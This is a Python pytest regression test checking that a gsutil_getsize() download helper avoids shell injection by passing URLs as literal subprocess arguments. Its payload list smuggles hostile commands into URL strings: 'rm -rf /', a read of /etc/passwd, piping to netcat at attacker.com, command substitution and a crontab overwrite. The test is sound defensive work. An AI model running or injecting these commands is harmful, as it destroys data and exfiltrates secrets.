import pytest
from unittest.mock import patch

from utils.downloads import gsutil_getsize


ADVERSARIAL_PAYLOADS = [
    "gs://bucket/file; rm -rf /",
    "gs://bucket/file && cat /etc/passwd",
    "gs://bucket/file | nc attacker.com 4444",
    "gs://bucket/file`whoami`",
    "gs://bucket/file$(id)",
    "gs://bucket/file\nrm -rf /",
    "gs://bucket/file > /etc/crontab",
    "gs://bucket/file\x00; rm -rf /",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_gsutil_getsize_no_shell_injection(payload):
    """Regression: gsutil_getsize() must not execute shell metacharacters in URL arguments.

    This test exercises the real gsutil_getsize() code path end-to-end.
    Only subprocess.check_output is mocked at the I/O boundary, so all
    argument-construction logic inside gsutil_getsize() runs under test.

    Security invariant: the URL is passed as a literal element of an argument
    list (shell=False), never interpolated into a shell command string.
    """
    mock_output = "1024  gs://bucket/file\n"

    with patch("utils.downloads.subprocess.check_output", return_value=mock_output) as mock_check:
        result = gsutil_getsize(payload)

        mock_check.assert_called_once()
        call_args, call_kwargs = mock_check.call_args

        # shell=True must never be used; the URL must be passed as a literal argument
        assert call_kwargs.get("shell", False) is False, (
            f"SECURITY VIOLATION: gsutil_getsize() called subprocess with shell=True "
            f"for payload {payload!r}."
        )
        assert isinstance(call_args[0], (list, tuple)), (
            f"subprocess args must be a list/tuple, got {type(call_args[0])}"
        )
        # Verify the gsutil command structure is intact
        assert list(call_args[0][:2]) == ["gsutil", "du"], (
            f"Expected command to start with ['gsutil', 'du'], got {list(call_args[0][:2])!r}"
        )
        # Verify the URL is passed as a discrete argument, not shell-interpolated
        assert payload in call_args[0], (
            f"URL payload not passed as a literal argument: {payload!r}"
        )
        assert result == 1024
